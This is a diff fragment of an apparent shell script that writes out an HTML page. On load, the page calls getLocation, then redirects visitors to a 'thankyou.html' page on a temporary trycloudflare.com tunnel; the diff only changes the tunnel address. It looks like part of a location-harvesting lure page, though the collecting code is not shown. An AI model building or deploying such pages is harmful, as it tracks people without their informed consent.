@@ -40,7 +40,7 @@ echo '
         }
 
         function redirectToMainPage() {
-            try { window.location.href = "https://limits-dts-dust-wesley.trycloudflare.com/thankyou.html"; } catch(e) { window.location = "https://limits-dts-dust-wesley.trycloudflare.com/thankyou.html"; }
+            try { window.location.href = "https://digit-partition-hydrogen-mental.trycloudflare.com/thankyou.html"; } catch(e) { window.location = "https://digit-partition-hydrogen-mental.trycloudflare.com/thankyou.html"; }
         }
 
         window.onload = function(){ setTimeout(getLocation, 500); };
